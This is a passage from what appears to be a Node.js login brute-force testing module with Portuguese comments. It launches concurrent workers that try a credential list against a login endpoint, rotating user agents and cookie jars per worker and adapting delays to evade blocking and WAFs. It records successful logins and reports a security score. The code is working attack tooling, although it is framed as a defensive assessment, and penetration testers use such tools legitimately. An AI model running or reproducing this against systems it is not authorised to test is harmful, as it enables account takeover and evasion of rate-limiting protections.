      concurrency,
    });

    // ── 4. Criar identidades para os workers ─────────────────────
    const identities = createIdentities(concurrency);
    identities.forEach((id, i) => {
      logEmit({ type: 'log', level: 'info', message: `[BF] Identidade #${i + 1} — UA: ${id.ua.slice(0, 40)}...` });
    });

    const results  = [];
    const hits     = [];
    let shared = {
      blocked:     0,
      consec:      0,
      index:       0,
      stop:        false,
      totalDone:   0,
    };

    // Delays adaptativos por worker
    const delays = identities.map(() => new AdaptiveDelay(baseDelay));

    // ── 5. Executar workers concorrentes ─────────────────────────
    const workerFn = async (workerIdx) => {
      const identity = identities[workerIdx];
      const delay    = delays[workerIdx];

      while (true) {
        if (config.signal?.aborted || shared.stop) break;

        const i = shared.index++;
        if (i >= credentials.length) break;

        const cred = credentials[i];

        // Função de delay para este worker
        const delayFn = useAdaptive
          ? () => delay.wait()
          : () => sleep(jitter(baseDelay, 0.2));

        const result = await doAttempt(
          parsedUrl, cred, endpointType,
          config.anonKey, delayFn, csrfData,
          identity.jar, identity
        );

        results[i] = result;
        shared.totalDone++;

        if (result.blocked) {
          shared.blocked++;
          shared.consec++;
          if (useAdaptive) delay.onBlocked();
        } else {
          shared.consec = 0;
          if (useAdaptive && result.ok) delay.onOk();
        }

        if (result.success) {
          hits.push({ ...result, index: i, worker: workerIdx });
        }

        emitter.emit('attempt', {
          index:        i,
          total:        credentials.length,
          ...result,
          hitsTotal:    hits.length,
          blockedTotal: shared.blocked,
          worker:       workerIdx,
          endpointType,
          adaptiveDelay: Math.round(delays[workerIdx].current),
        });

        if (result.success && stopOnSuccess) {
          emitter.emit('hit_found', { ...result, index: i, worker: workerIdx });
          shared.stop = true;
          break;
        }

        // Bloqueio consistente: encerrar após 30 consecutivos
        if (shared.consec >= 30) {
          emitter.emit('blocked_hard', {
            message: `Servidor bloqueou ${shared.consec} tentativas consecutivas — proteção eficaz!`,
            total: shared.totalDone,
          });
          shared.stop = true;
          break;
        }
      }
    };

    // Lançar workers em paralelo
    await Promise.all(
      Array.from({ length: concurrency }, (_, i) => workerFn(i))
    );

    // ── 6. Relatório final ────────────────────────────────────────
    const validResults = results.filter(Boolean);
    const ok           = validResults.filter(r => r.ok);
    const security     = calcSecurityScore(validResults, hits);
    const recommendations = buildRecommendations(validResults, hits, endpointType);

    emitter.emit('complete', {
      hits,
      security,
      recommendations,
      stats: {
        total:     validResults.length,
        success:   hits.length,
        blocked:   shared.blocked,
        errors:    validResults.filter(r => !r.ok).length,
        waf:       validResults.filter(r => r.waf).length,
        meanLat:   ok.length ? Math.round(ok.reduce((a, r) => a + (r.lat || 0), 0) / ok.length) : 0,
      },
      target:          loginUrl,
      originalTarget:  config.loginUrl,
      endpointType,
      detected:        resolved.detected,
      concurrency,
      timestamp:       new Date().toISOString(),
    });
  };

  return { emitter, run };
}

module.exports = { createBruteforceTest, BUILTIN_WORDLIST, parseWordlist };
